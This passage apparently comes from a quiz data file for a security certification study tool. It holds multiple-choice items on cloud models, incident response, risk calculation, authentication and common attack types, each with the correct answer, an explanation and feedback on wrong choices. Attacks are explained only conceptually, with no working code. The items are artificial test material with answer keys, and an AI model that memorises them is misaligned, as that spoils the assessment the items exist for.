    wrongFeedback:{ 0:"Accepting risk with NO additional controls is negligent when protecting critical infrastructure. Risk must be reduced to an acceptable level.", 1:"Immediate replacement of SCADA/ICS infrastructure is rarely feasible — it requires regulatory approval, procurement, and extended validation to avoid causing outages to critical systems.", 3:"Antivirus on SCADA systems is often incompatible with industrial software and may cause instability. Isolation and monitoring are the industry-standard approach." }},

  { id:"m021", ch:"3", difficulty:"easy", topic:"Cloud Security",
    q:"Which cloud deployment model is EXCLUSIVELY used by a single organisation and is NOT shared with other tenants?",
    opts:["Public cloud","Community cloud","Hybrid cloud","Private cloud"], correct:3,
    exp:"A private cloud is dedicated to a single organisation — either hosted on-premises or by a provider but with dedicated infrastructure. There is no multi-tenancy risk.",
    wrongFeedback:{ 0:"Public cloud is shared infrastructure across many organisations (multi-tenant). Resources are isolated logically, not physically.", 1:"A community cloud is shared among organisations with similar needs (e.g. government agencies or healthcare orgs).", 2:"Hybrid cloud combines private and public cloud — it still involves public cloud components shared with others." }},

  // ── CHAPTER 4: Security Operations ──────────────────────────
  { id:"m022", ch:"4", difficulty:"easy", topic:"Incident Response",
    q:"An analyst confirms a system is actively spreading malware across the network. According to the NIST incident response lifecycle, what should happen IMMEDIATELY after detection and analysis?",
    opts:["Eradication — remove the malware","Recovery — restore affected systems","Containment — stop the spread","Lessons learned — document the incident"], correct:2,
    exp:"NIST SP 800-61 phases: Preparation → Detection & Analysis → CONTAINMENT → Eradication → Recovery → Lessons Learned. Containment must come before eradication to stop further damage while preserving evidence.",
    wrongFeedback:{ 0:"Eradication (removing malware) comes AFTER containment. Attempting to clean systems while they are still spreading malware is ineffective.", 1:"Recovery comes after eradication. Restoring systems while the threat is active risks immediate reinfection.", 3:"Lessons learned is the final phase completed after the incident is fully resolved." }},

  { id:"m023", ch:"4", difficulty:"medium", topic:"Vulnerability Management",
    q:"A scan finds a critical vulnerability (CVSS 9.1) on a server that processes no sensitive data, has no internet exposure, and sits behind three firewall layers. How should the EFFECTIVE risk be classified?",
    opts:["Critical — CVSS score always determines priority","High — environmental factors reduce the base score","Informational — internal servers are never at risk","Low — the server is not important"], correct:1,
    exp:"CVSS Environmental Score allows organisations to adjust the base score based on their specific context: network accessibility (multiple firewall layers), data sensitivity, and business impact. The effective risk is lower than the base score, but the vulnerability should still be remediated.",
    wrongFeedback:{ 0:"CVSS base scores do not consider your specific environment. Security teams must apply environmental context to prioritise effectively.", 2:"Informational findings have minimal risk. A CVSS 9.1 vulnerability reduced by strong compensating controls still warrants a high or medium classification.", 3:"The server's importance is separate from the technical vulnerability risk. Even low-value servers can be used for lateral movement." }},

  { id:"m024", ch:"4", difficulty:"medium", topic:"Monitoring & SIEM",
    q:"A SIEM alerts on a single user account authenticating from London at 9 AM and then from Singapore at 9:15 AM. Which indicator of compromise category does this represent?",
    opts:["Account lockout","Resource consumption anomaly","Impossible travel","Out-of-cycle logging"], correct:2,
    exp:"Impossible travel detects logons from geographically distant locations within a timeframe that makes physical travel impossible. This is a strong indicator of credential compromise — one of the sessions is likely an attacker using stolen credentials.",
    wrongFeedback:{ 0:"Account lockout occurs when failed login attempts exceed a threshold. Both logins here succeeded.", 1:"Resource consumption anomaly refers to unusual CPU, memory, or bandwidth usage — typically associated with cryptomining malware.", 3:"Out-of-cycle logging refers to activity at unusual times for the user (e.g. logs at 3 AM for a 9-to-5 employee). This scenario is specifically about geographic impossibility." }},

  { id:"m025", ch:"4", difficulty:"hard", topic:"Digital Forensics",
    q:"During a forensic investigation, the analyst needs to ensure that evidence collected from a device will be admissible in court. Which action is MOST critical?",
    opts:["Taking photos of the device","Creating a cryptographic hash of the disk image BEFORE and AFTER acquisition","Running antivirus on the device","Interviewing the device owner"], correct:1,
    exp:"Maintaining chain of custody requires proving the evidence was not altered. Hashing the original media and the forensic image (using SHA-256 or MD5) before and after acquisition proves the copy is an exact duplicate and was not tampered with.",
    wrongFeedback:{ 0:"Photos document the physical state but do not prove the digital contents were not modified.", 2:"Running antivirus modifies the device (log files, quarantine actions) — this taints the evidence and can make it inadmissible.", 3:"Interviewing the owner is useful for investigation context but does not preserve or verify the integrity of digital evidence." }},

  { id:"m026", ch:"4", difficulty:"easy", topic:"Identity Management",
    q:"A new employee joins the company. Which process defines what systems and data they should be given access to, based on their job role?",
    opts:["Offboarding","Provisioning","Separation of duties","Mandatory access control"], correct:1,
    exp:"Provisioning (onboarding) is the process of creating accounts and assigning access rights appropriate to the employee's role, following the principle of least privilege.",
    wrongFeedback:{ 0:"Offboarding is the process of revoking access and disabling accounts when an employee leaves.", 2:"Separation of duties ensures critical tasks require multiple people — it is a task-division concept, not an access provisioning process.", 3:"Mandatory access control is a classification-based enforcement model — it is the mechanism, not the provisioning process." }},

  { id:"m027", ch:"4", difficulty:"hard", topic:"Endpoint Hardening",
    q:"A company allows employees to use personal smartphones for work email (BYOD). Which solution gives the organisation control over ONLY the corporate data and apps on the device, without wiping the entire personal phone?",
    opts:["MDM — Mobile Device Management","MAM — Mobile Application Management","COPE — Corporate-Owned, Personally Enabled","COBO — Corporate-Owned, Business Only"], correct:1,
    exp:"MAM (Mobile Application Management) manages only the corporate apps and the data within them, without touching personal apps or data. This makes it ideal for BYOD where employees legitimately object to full device management.",
    wrongFeedback:{ 0:"MDM manages the entire device — it can remotely wipe the whole phone, which raises privacy concerns for personal BYOD devices.", 2:"COPE means the company owns the device but allows personal use — this is not BYOD (the employee owns the phone).", 3:"COBO means the company owns the device and it is used only for business — no personal use. This is the opposite of BYOD." }},

  // ── CHAPTER 5: Security Program Management ───────────────────
  { id:"m028", ch:"5", difficulty:"easy", topic:"Governance",
    q:"A document that mandates all employees must use a minimum 12-character password is BEST classified as which type of governance document?",
    opts:["Guideline","Procedure","Standard","Policy"], correct:2,
    exp:"A standard sets specific measurable requirements (e.g. minimum password length of 12). Standards are mandatory and derived from policies. A policy states the 'what' (must use strong passwords); a standard states the 'how much' (at least 12 characters).",
    wrongFeedback:{ 0:"A guideline is a recommendation — it is NOT mandatory. Password minimum length is an enforceable requirement.", 1:"A procedure is a step-by-step instruction on how to perform a task, not a measurable requirement.", 3:"A policy is higher-level and less specific (e.g. 'Employees must use strong passwords'). The specific 12-character requirement is a standard." }},

  { id:"m029", ch:"5", difficulty:"medium", topic:"Risk Management",
    q:"An organisation's server is valued at $500,000. A flood risk assessment indicates a 10% annual chance of flooding, and a flood would destroy 60% of the server's value. What is the Annualized Loss Expectancy (ALE)?",
    opts:["$300,000","$50,000","$30,000","$500,000"], correct:2,
    exp:"SLE = Asset Value × Exposure Factor = $500,000 × 0.60 = $300,000. ALE = SLE × ARO = $300,000 × 0.10 = $30,000. The ALE is the expected annual financial impact of this specific risk.",
    wrongFeedback:{ 0:"$300,000 is the SLE — the cost of a SINGLE flood event. ALE multiplies by the annual probability (0.10).", 1:"$50,000 applies the ARO to the full asset value ($500,000 × 0.10) — this skips the exposure factor calculation.", 3:"$500,000 is the full asset value with 100% destruction every year — this ignores both probability and partial loss." }},

  { id:"m030", ch:"5", difficulty:"medium", topic:"Compliance & Privacy",
    q:"A European customer requests that a company permanently delete all personal data held about them. Which regulation grants this right, and what is it called?",
    opts:["HIPAA — Right to Amendment","PCI DSS — Data Minimisation","GDPR — Right to Erasure (Right to be Forgotten)","SOX — Data Retention Requirement"], correct:2,
    exp:"The GDPR (General Data Protection Regulation) grants EU data subjects the 'right to erasure' (Article 17), commonly called the 'right to be forgotten'. Organisations must delete personal data upon request unless legal grounds for retention exist.",
    wrongFeedback:{ 0:"HIPAA's right to amendment allows patients to correct inaccurate medical records — it does not mandate deletion of all records.", 1:"PCI DSS data minimisation limits the collection of card data — it does not grant individuals the right to request deletion.", 3:"SOX actually REQUIRES certain financial records to be retained — it is the opposite of a deletion right." }},

  { id:"m031", ch:"5", difficulty:"hard", topic:"Risk Management",
    q:"An organisation chooses to purchase cyber insurance to cover potential losses from a data breach. Which risk response strategy does this represent?",
    opts:["Risk avoidance","Risk mitigation","Risk transfer","Risk acceptance"], correct:2,
    exp:"Risk transfer shifts the financial consequences of a risk to a third party (the insurer). The risk itself still exists — it has not been eliminated or reduced — but the financial impact is transferred. Outsourcing IT operations also transfers risk contractually.",
    wrongFeedback:{ 0:"Risk avoidance eliminates the risk by stopping the risky activity entirely (e.g. not launching an online service at all).", 1:"Risk mitigation implements controls to reduce the likelihood or impact of the risk (e.g. deploying MFA or encryption).", 3:"Risk acceptance acknowledges the risk and decides to live with it without further action — insurance is an active response, not passive acceptance." }},

  { id:"m032", ch:"5", difficulty:"easy", topic:"Business Continuity",
    q:"A company's recovery time objective (RTO) for its payment system is 4 hours. What does this mean?",
    opts:["The system must back up data every 4 hours","The maximum acceptable time before the system must be restored after a disruption is 4 hours","The system can afford to lose 4 hours of data","The system must be available 4 hours per day"], correct:1,
    exp:"RTO (Recovery Time Objective) is the maximum acceptable length of time that a system can be offline after a failure. The payment system must be restored within 4 hours to meet the business requirement.",
    wrongFeedback:{ 0:"Backup frequency is related to RPO (Recovery Point Objective), not RTO.", 2:"The amount of acceptable data loss is the RPO (Recovery Point Objective). RTO concerns restoration TIME.", 3:"Availability percentage is a separate SLA metric. RTO specifically defines the maximum outage duration." }},

  // ── CHAPTER 1 additional (m033–m050) ────────────────────────
  { id:"m033", ch:"1", difficulty:"easy", topic:"CIA Triad",
    q:"A database administrator accidentally overwrites a production table with test data. Which CIA Triad property has been violated?",
    opts:["Confidentiality","Integrity","Availability","Non-repudiation"], correct:1,
    exp:"Integrity means data remains accurate and unaltered except through authorised processes. Overwriting production data with incorrect test data violates integrity — the data is no longer accurate.",
    wrongFeedback:{ 0:"Confidentiality concerns unauthorised parties accessing data. An authorised admin made this change — the violation is data accuracy.", 2:"Availability concerns whether data can be accessed at all. The data is still accessible — it is simply wrong.", 3:"Non-repudiation concerns whether actions can be denied. The core violation here is data accuracy." }},

  { id:"m034", ch:"1", difficulty:"medium", topic:"Authentication",
    q:"Which authentication protocol issues a ticket-granting ticket (TGT) after initial login, allowing users to access multiple services without re-entering credentials?",
    opts:["RADIUS","TACACS+","Kerberos","LDAP"], correct:2,
    exp:"Kerberos uses a Key Distribution Centre (KDC). After initial login, the KDC issues a TGT. The user presents the TGT to get service tickets for individual resources — enabling single sign-on.",
    wrongFeedback:{ 0:"RADIUS is an AAA protocol for network access control — it does not issue TGTs.", 1:"TACACS+ provides AAA for network devices — it does not use a ticket-granting model.", 3:"LDAP is a directory protocol for user lookups — not an authentication ticket system." }},

  { id:"m035", ch:"1", difficulty:"hard", topic:"Cryptography Basics",
    q:"An organisation uses AES-128 to encrypt sensitive files. A security auditor recommends upgrading to AES-256. Which statement BEST justifies this recommendation?",
    opts:["AES-256 is faster than AES-128","AES-256 provides a larger key space, providing a better security margin against future computing advances","AES-128 has known weaknesses that allow plaintext recovery","AES-256 uses a different block size, providing stronger authentication"], correct:1,
    exp:"AES-256 uses a 256-bit key (2^256 possible keys vs 2^128). Both are currently secure, but AES-256 offers a much larger security margin — especially relevant against potential quantum computing threats where Grover's algorithm effectively halves key length.",
    wrongFeedback:{ 0:"AES-256 is slightly slower than AES-128 due to additional key schedule rounds.", 2:"AES-128 has no known practical weaknesses — it remains computationally infeasible to break.", 3:"Both AES-128 and AES-256 use a 128-bit block size. AES is a block cipher, not an authentication scheme." }},

  { id:"m036", ch:"1", difficulty:"easy", topic:"Security Controls",
    q:"A 'no tailgating' policy requires each person to badge in individually before the door closes. What physical control BEST enforces this?",
    opts:["Mantrap / access control vestibule","Bollard","CCTV","Biometric scanner"], correct:0,
    exp:"A mantrap (access control vestibule) has two doors — the first must fully close and the person must be authenticated before the second opens. This physically prevents tailgating by ensuring only one person passes through at a time.",
    wrongFeedback:{ 1:"A bollard prevents vehicle ramming — it does not control pedestrian access.", 2:"CCTV records or detects tailgating after the fact (detective) but does not physically prevent it.", 3:"A biometric scanner authenticates identity but does not physically prevent a second person from following through." }},

  { id:"m037", ch:"1", difficulty:"medium", topic:"PKI & Certificates",
    q:"An organisation wants certificates to be checked in real time rather than relying on a periodically updated list. Which technology supports this?",
    opts:["Certificate Revocation List (CRL)","OCSP — Online Certificate Status Protocol","Certificate pinning","Key escrow"], correct:1,
    exp:"OCSP allows clients to query the Certificate Authority in real time to check revocation status. Unlike CRLs, which are downloaded periodically and can be stale, OCSP provides an immediate response.",
    wrongFeedback:{ 0:"A CRL is a periodically published list — it can be out of date between publications.", 2:"Certificate pinning hardcodes expected certificate values — it does not handle revocation checking.", 3:"Key escrow stores copies of private keys for recovery — unrelated to revocation status checking." }},

  { id:"m038", ch:"1", difficulty:"hard", topic:"Zero Trust",
    q:"In Zero Trust architecture, which component evaluates policy and determines whether a subject should be granted access to a resource?",
    opts:["Policy Enforcement Point (PEP)","Policy Decision Point (PDP)","Identity Provider (IdP)","Security Information and Event Management (SIEM)"], correct:1,
    exp:"The Policy Decision Point (PDP) / Policy Engine evaluates access requests against policies and makes the allow/deny decision. The Policy Enforcement Point (PEP) sits inline and enforces that decision. The PDP is the 'brain'; the PEP is the 'gate'.",
    wrongFeedback:{ 0:"The PEP enforces the decision but does not make it — it relays requests to the PDP and acts on the response.", 2:"An IdP verifies identity (authenticates) but does not make authorisation policy decisions.", 3:"A SIEM aggregates logs for threat detection — it does not make real-time access decisions." }},

  { id:"m039", ch:"1", difficulty:"easy", topic:"Cryptography Basics",
    q:"Which of the following BEST describes a hash function used for password storage?",
    opts:["A reversible function that encrypts the password","A one-way function that produces a fixed-length digest that cannot be reversed","A function that stores the password in encoded format","A function that compresses the password to save space"], correct:1,
    exp:"A cryptographic hash function is one-way — it maps input to a fixed-length digest and it is computationally infeasible to reverse. This is why hashed passwords cannot be 'decrypted' — only compared.",
    wrongFeedback:{ 0:"Encryption is reversible with the correct key — hashing is not. Storing reversible encrypted passwords is poor practice.", 2:"Encoding (like Base64) is completely reversible and provides no security.", 3:"Compression reduces file size and is reversible — it has no cryptographic security properties." }},

  { id:"m040", ch:"1", difficulty:"medium", topic:"Security Controls",
    q:"Which access control model assigns permissions based on sensitivity labels (e.g. Secret, Top Secret) and subject clearance levels, used in government/military contexts?",
    opts:["Discretionary Access Control (DAC)","Role-Based Access Control (RBAC)","Mandatory Access Control (MAC)","Attribute-Based Access Control (ABAC)"], correct:2,
    exp:"MAC assigns sensitivity labels to objects and clearance levels to subjects. The operating system enforces rules — a subject can only access objects at or below their clearance level. Individuals cannot override these rules.",
    wrongFeedback:{ 0:"In DAC, the resource owner decides who can access it — the opposite of the rigid, system-enforced MAC model.", 1:"RBAC assigns permissions based on job roles — it does not use sensitivity labels or clearance levels.", 3:"ABAC uses multiple attributes (user, resource, environment) for flexible policy-based decisions — not label-based." }},

  { id:"m041", ch:"1", difficulty:"easy", topic:"Authentication",
    q:"MFA requires factors from different categories. Which combination correctly uses two DIFFERENT factor categories?",
    opts:["Password and security question","Smart card and fingerprint scan","PIN and password","Two OTPs from two different authenticator apps"], correct:1,
    exp:"A smart card is 'something you have' and a fingerprint is 'something you are' — two different categories. Passwords and security questions are both 'something you know'. PINs are also 'something you know'. Two OTPs are both 'something you have'.",
    wrongFeedback:{ 0:"Both a password and a security question are 'something you know' — same category, not MFA.", 2:"A PIN and a password are both 'something you know' — same category, not MFA.", 3:"Two OTPs from different apps are both 'something you have' — same category. MFA requires factors from DIFFERENT categories." }},

  { id:"m042", ch:"1", difficulty:"hard", topic:"Authentication",
    q:"An application stores passwords using MD5 without salting. Which attack is MOST effective against this storage method?",
    opts:["Dictionary attack targeting individual accounts","Rainbow table attack using precomputed MD5 hashes","Brute-force from single-character passwords upward","Credential stuffing from breached databases"], correct:1,
    exp:"MD5 without salt is highly vulnerable to rainbow table attacks because identical passwords always produce identical hashes. An attacker with precomputed MD5 tables can reverse any matching hash in milliseconds by simple lookup. Adding a unique salt would make rainbow tables useless.",
    wrongFeedback:{ 0:"A dictionary attack is effective but slow — rainbow tables are far faster because the work is precomputed.", 2:"Brute-force from single-character passwords works but takes much longer than a rainbow table lookup.", 3:"Credential stuffing tries credentials from other breached sites — effective when users reuse passwords but independent of the hash algorithm." }},

  { id:"m043", ch:"1", difficulty:"medium", topic:"PKI & Certificates",
    q:"A web server certificate is issued by a company's internal CA. When a public internet user visits the site, the browser shows a certificate error. What is the MOST likely cause?",
    opts:["The certificate has expired","The internal CA is not in the browser's trusted root CA store","The web server is using an outdated TLS version","The certificate is using RSA rather than ECC"], correct:1,
    exp:"Browsers ship with a pre-installed list of trusted root CAs. An internal/private CA is not included. When the browser encounters a certificate signed by an unknown CA, it cannot build a trusted chain and displays an error. Public-facing sites need certificates from publicly trusted CAs.",
    wrongFeedback:{ 0:"Certificate expiry produces a similar error, but the internal CA being untrusted is the most likely cause for public users.", 2:"Outdated TLS versions cause separate warnings — not certificate trust errors.", 3:"RSA is widely supported — it does not cause certificate trust errors in modern browsers." }},

  { id:"m044", ch:"1", difficulty:"easy", topic:"Security Controls",
    q:"Which security principle ensures no single person can perform a complete high-risk transaction (e.g. both request AND approve a wire transfer)?",
    opts:["Least privilege","Job rotation","Separation of duties","Mandatory vacation"], correct:2,
    exp:"Separation of duties ensures that sensitive processes require multiple people. This prevents fraud and errors — one person requests, another approves. It is a key control in financial and administrative processes.",
    wrongFeedback:{ 0:"Least privilege restricts the scope of what a user can access — it doesn't require multiple people for a single task.", 1:"Job rotation moves employees between roles periodically to detect fraud — it doesn't split individual transactions.", 3:"Mandatory vacation forces time off to allow audits — it does not split task approval." }},

  { id:"m045", ch:"1", difficulty:"medium", topic:"Cryptography Basics",
    q:"Which algorithm is a key derivation function specifically designed to be computationally expensive, making brute-force password attacks slower?",
    opts:["MD5","SHA-256","bcrypt","AES-256"], correct:2,
    exp:"bcrypt (along with Argon2 and scrypt) is a password-hashing function with a configurable work factor that makes each hash computation intentionally slow. This directly counters brute-force attacks — even with fast hardware, each guess takes significant time.",
    wrongFeedback:{ 0:"MD5 is a fast hashing algorithm with no work factor — fast algorithms make brute-force attacks easier, not harder.", 1:"SHA-256 is also a fast general-purpose hash function — fast algorithms are poor choices for password storage.", 3:"AES-256 is a symmetric encryption algorithm — it is not a password hashing or key derivation function." }},

  // ── CHAPTER 2 additional (m046–m060) ────────────────────────
  { id:"m046", ch:"2", difficulty:"easy", topic:"Social Engineering",
    q:"An attacker sends emails to thousands of random addresses pretending to be a bank and asking recipients to verify payment details. Which attack is this?",
    opts:["Whaling","Spear phishing","Phishing","Vishing"], correct:2,
    exp:"Phishing is a broad, untargeted attack sent to many people, impersonating a trusted organisation to harvest credentials. The key distinction is the lack of targeting — the attacker casts a wide net.",
    wrongFeedback:{ 0:"Whaling targets high-value executives — it is a highly targeted attack, not a mass mailing.", 1:"Spear phishing is crafted for a specific named individual with personalised details. Mass emails are generic phishing.", 3:"Vishing is conducted over voice calls — this attack uses email." }},

  { id:"m047", ch:"2", difficulty:"easy", topic:"Social Engineering",
    q:"An attacker leaves a USB drive labelled 'Payroll Q3 — Confidential' in a company car park. An employee plugs it in out of curiosity. Which technique is this?",
    opts:["Phishing","Baiting","Pretexting","Watering hole"], correct:1,
    exp:"Baiting uses physical media (USB drives) or enticing offers to lure victims into taking a security-compromising action. The label exploits curiosity without the attacker being present.",
    wrongFeedback:{ 0:"Phishing uses electronic messages — this attack uses a physical object.", 2:"Pretexting involves constructing a fabricated scenario and communicating directly with the target.", 3:"A watering hole attack compromises a website — this attack uses a physical device." }},

  { id:"m048", ch:"2", difficulty:"medium", topic:"Malware Types",
    q:"After a disgruntled employee is terminated, payroll records are deleted three months later. Investigation reveals code planted before departure set to trigger on a specific date. What malware type is this?",
    opts:["Trojan","Logic bomb","Ransomware","Rootkit"], correct:1,
    exp:"A logic bomb remains dormant until a specific condition is met (a date, event, or account deletion). It is a common insider threat tool — planted before departure to cause damage later.",
    wrongFeedback:{ 0:"A Trojan disguises itself as legitimate software — it doesn't rely on a trigger condition.", 2:"Ransomware encrypts files and demands payment. Records here are deleted, not encrypted.", 3:"A rootkit hides malware at a deep OS level — a concealment mechanism, not a timed destruction tool." }},

  { id:"m049", ch:"2", difficulty:"medium", topic:"Network Attacks",
    q:"An attacker exploits DNS implementations by sending a small query (60 bytes) that triggers a 3,000-byte response directed at a victim's IP, amplifying bandwidth by 50x. Which attack is this?",
    opts:["DNS cache poisoning","DNS amplification / reflection DDoS","DNS hijacking","Zone transfer abuse"], correct:1,
    exp:"DNS amplification is a reflected DDoS technique. The attacker sends small DNS queries with the victim's spoofed source IP to open resolvers. The resolvers send large responses to the victim, overwhelming their bandwidth.",
    wrongFeedback:{ 0:"DNS cache poisoning inserts false records to redirect users — it does not involve traffic amplification.", 2:"DNS hijacking redirects users to malicious sites — it does not generate amplified traffic floods.", 3:"Zone transfer abuse allows copying of DNS zone data — an information disclosure issue, not amplification." }},

  { id:"m050", ch:"2", difficulty:"hard", topic:"Network Attacks",
    q:"An attacker intercepts DNS responses and replaces legitimate IPs with attacker-controlled IPs. Which attack is this and what does it enable?",
    opts:["DNS amplification — DDoS attacks against the DNS server","DNS cache poisoning — on-path redirection by inserting false records","ARP spoofing — interception of Layer 2 frames","BGP hijacking — rerouting internet traffic at the routing level"], correct:1,
    exp:"DNS cache poisoning inserts false DNS records into a resolver's cache. Future clients receive attacker-controlled IPs, silently redirecting them to fake sites. Prevention includes DNSSEC, which adds digital signatures to DNS records.",
    wrongFeedback:{ 0:"DNS amplification floods a victim with traffic — it attacks the victim, not the DNS records.", 2:"ARP spoofing operates at Layer 2 within a local segment — DNS poisoning attacks the name resolution layer.", 3:"BGP hijacking manipulates routing announcements at the backbone level — DNS poisoning targets name-to-IP translation." }},

  { id:"m051", ch:"2", difficulty:"medium", topic:"Application Vulnerabilities",
    q:"A web application reflects unsanitised input directly back in a HTTP response. An attacker crafts a URL with a script tag. When a victim clicks the link, the script runs in their browser and steals the session cookie. Which attack is this?",
    opts:["Stored XSS","Reflected XSS","DOM-based XSS","SQL injection"], correct:1,
    exp:"Reflected XSS (non-persistent) occurs when user input is immediately reflected in the HTTP response without sanitisation. The script is embedded in the URL. Prevention: encode all output, set HttpOnly cookie flag, implement Content Security Policy.",
    wrongFeedback:{ 0:"Stored XSS saves the malicious script on the server — every visitor loads it without any special link.", 2:"DOM-based XSS manipulates the client-side DOM using JavaScript — different execution path.", 3:"SQL injection targets database queries — it does not execute JavaScript in victims' browsers." }},

  { id:"m052", ch:"2", difficulty:"hard", topic:"Application Vulnerabilities",
    q:"A security researcher finds that an API uses predictable sequential IDs (e.g. /api/orders/1001) and any authenticated user can access any order ID. What vulnerability is this?",
    opts:["Insecure Direct Object Reference (IDOR)","Server-Side Request Forgery (SSRF)","Cross-Site Request Forgery (CSRF)","Mass assignment"], correct:0,
    exp:"IDOR occurs when an application uses a user-controlled reference to directly access an object without verifying the requesting user is authorised. Fix: server-side authorisation check — verify the authenticated user owns the requested resource.",
    wrongFeedback:{ 1:"SSRF tricks the server into making requests to internal resources — this attack is about accessing other users' data via predictable IDs.", 2:"CSRF tricks an authenticated user's browser into making unauthorised requests — this is an authorisation issue between users.", 3:"Mass assignment binds all submitted parameters to object properties — unrelated to predictable ID enumeration." }},

  { id:"m053", ch:"2", difficulty:"medium", topic:"Application Vulnerabilities",
    q:"A developer writes code that does not check input size before copying it into a fixed-size memory buffer. An attacker sends oversized input, overwriting adjacent memory. What vulnerability is this?",
    opts:["SQL injection","Cross-site scripting","Buffer overflow","Race condition"], correct:2,
    exp:"A buffer overflow occurs when a program writes more data to a buffer than it can hold, overflowing into adjacent memory. Attackers can overwrite return addresses to redirect execution to malicious code. Fix: input validation and bounds checking.",
    wrongFeedback:{ 0:"SQL injection inserts malicious SQL syntax into database queries — it is a query manipulation issue, not a memory management issue.", 1:"XSS injects JavaScript into web pages — it operates at the web application layer, not at the memory level.", 3:"A race condition exploits timing between checking a condition and acting on it. Buffer overflows are caused by missing bounds checking." }},

  { id:"m054", ch:"2", difficulty:"medium", topic:"Malware Types",
    q:"Malware spreads automatically across a network by exploiting vulnerabilities, requiring no user interaction. What type of malware is this?",
    opts:["Virus","Worm","Trojan","Ransomware"], correct:1,
    exp:"A worm is self-propagating — it spreads across networks automatically by exploiting vulnerabilities without requiring a host file or user interaction.",
    wrongFeedback:{ 0:"A virus requires a host file and typically needs user interaction to spread — it does not self-propagate autonomously.", 2:"A Trojan disguises itself as legitimate software — it does not self-replicate across networks.", 3:"Ransomware encrypts files and demands payment — it describes the payload's behaviour, not propagation method." }},

  { id:"m055", ch:"2", difficulty:"hard", topic:"Application Vulnerabilities",
    q:"An application checks if a file path is safe BEFORE opening it, but an attacker changes the file to a symlink between the check and the open operation. What vulnerability is this?",
    opts:["Buffer overflow","SQL injection","Race condition (Time-of-check to Time-of-use)","Directory traversal"], correct:2,
    exp:"This is TOCTOU (Time-of-Check to Time-of-Use) — a race condition. The attacker exploits the window between the check and the use to change the resource's state. Fix: hold an exclusive lock or use the file descriptor rather than the path.",
    wrongFeedback:{ 0:"A buffer overflow writes beyond allocated memory — no memory management issue is described here.", 1:"SQL injection embeds malicious SQL in queries — this attack involves filesystem timing.", 3:"Directory traversal uses '../' sequences — this attack exploits the time gap between a security check and its use." }},

  // ── CHAPTER 3 additional (m056–m065) ────────────────────────
  { id:"m056", ch:"3", difficulty:"easy", topic:"Network Infrastructure",
    q:"Which network device operates at Layer 3 of the OSI model and forwards packets based on IP addresses?",
    opts:["Switch","Hub","Router","Wireless access point"], correct:2,
    exp:"A router operates at Layer 3 (Network) and makes forwarding decisions based on IP addresses in routing tables. Switches operate at Layer 2 using MAC addresses. Hubs are Layer 1 devices.",
    wrongFeedback:{ 0:"A managed switch operates at Layer 2, forwarding frames based on MAC addresses.", 1:"A hub is a Layer 1 device that simply repeats signals to all ports — no address-based forwarding.", 3:"A wireless access point operates at Layer 2, providing wireless connectivity — it does not route between networks." }},

  { id:"m057", ch:"3", difficulty:"medium", topic:"Secure Design",
    q:"A developer wants to ensure no single developer can both write AND deploy code to production. Which security principle does this implement?",
    opts:["Least privilege","Defence in depth","Separation of duties","Fail-safe defaults"], correct:2,
    exp:"Separation of duties ensures that no single person can complete a sensitive end-to-end process alone. Requiring different people to write and deploy code means a malicious developer cannot introduce and deploy backdoor code undetected.",
    wrongFeedback:{ 0:"Least privilege restricts access rights to the minimum needed — it doesn't inherently require multiple people for a single process.", 1:"Defence in depth uses multiple overlapping security layers — the specific principle of requiring multiple people is separation of duties.", 3:"Fail-safe defaults ensure systems are secure after a failure — it does not relate to dividing responsibilities." }},

  { id:"m058", ch:"3", difficulty:"easy", topic:"Cloud Security",
    q:"Which cloud service model provides access to software applications over the internet, with the provider managing all underlying infrastructure, platform, and application components?",
    opts:["IaaS","PaaS","SaaS","FaaS"], correct:2,
    exp:"SaaS (Software as a Service) delivers fully managed applications over the internet — examples include Google Workspace and Microsoft 365. The customer only manages user accounts, data, and configuration.",
    wrongFeedback:{ 0:"IaaS provides virtualised compute/storage/networking — the customer manages the OS and everything above.", 1:"PaaS provides a development platform — the customer manages their application code and data.", 3:"FaaS (Function as a Service / serverless) provides individual function execution — a more specific model between IaaS and PaaS." }},

  { id:"m059", ch:"3", difficulty:"medium", topic:"Data Protection",
    q:"Which data state describes information actively being processed by an application in CPU or held in RAM?",
    opts:["Data at rest","Data in transit","Data in use","Data in motion"], correct:2,
    exp:"Data in use refers to data actively processed by a CPU, loaded into RAM, or being read/written by an application. This state is hardest to protect — the data must be decrypted for processing. Trusted Execution Environments help protect data in use.",
    wrongFeedback:{ 0:"Data at rest is stored data on disk, SSD, or database — protected by encryption at rest.", 1:"Data in transit is data moving across a network — protected by transport encryption (TLS, IPSec).", 3:"'Data in motion' is another term for data in transit — it refers to network transmission, not CPU processing." }},

  { id:"m060", ch:"3", difficulty:"hard", topic:"Cloud Security",
    q:"An organisation moves to PaaS. The application is later compromised through a vulnerability in the underlying container orchestration platform. Who is responsible?",
    opts:["The customer — they control all aspects of PaaS","The cloud provider — in PaaS, the provider manages the runtime and platform layers","Both share equal responsibility","The third-party container vendor, not the cloud provider"], correct:1,
    exp:"In PaaS, the cloud provider is responsible for the runtime, middleware, and platform. A vulnerability in the container orchestration platform falls within the provider's responsibility boundary in PaaS.",
    wrongFeedback:{ 0:"In PaaS, the customer does NOT control the runtime or platform — that is precisely what the provider manages.", 2:"Responsibility is divided along model-specific boundaries, not equally. Platform vulnerabilities are the provider's responsibility in PaaS.", 3:"The cloud provider is accountable for the platform they offer regardless of which underlying technologies they choose." }},

  { id:"m061", ch:"3", difficulty:"easy", topic:"SCADA/ICS",
    q:"A power plant's industrial control system cannot be connected to the internet or any external network. What security architecture is this?",
    opts:["DMZ","Network segmentation","Air gap","Zero Trust"], correct:2,
    exp:"An air gap is complete physical isolation — no wired or wireless connections to outside networks. This is the highest form of network isolation, used for critical infrastructure and classified systems.",
    wrongFeedback:{ 0:"A DMZ allows limited external access — the opposite of the isolation described.", 1:"Network segmentation divides a network into zones with controlled traffic — the system could still communicate within the organisation.", 3:"Zero Trust is an architectural philosophy about verification — it does not describe physical network isolation." }},

  { id:"m062", ch:"3", difficulty:"medium", topic:"Virtualization",
    q:"Which security concern is UNIQUE to virtualised environments compared to physical environments?",
    opts:["Malware infection","Data breach","VM escape","Phishing attacks"], correct:2,
    exp:"VM escape is virtualisation-specific — a process running inside a VM exploits a hypervisor vulnerability to break out and interact with the host or other VMs. This attack vector does not exist in non-virtualised environments.",
    wrongFeedback:{ 0:"Malware infection affects both physical and virtual systems.", 1:"Data breaches affect both physical and virtual environments.", 3:"Phishing targets users through email or web content — not specific to virtualised infrastructure." }},

  { id:"m063", ch:"3", difficulty:"hard", topic:"Network Infrastructure",
    q:"An organisation wants to allow partners to access one specific internal application without exposing the entire internal network. Which architecture BEST achieves this with least privilege?",
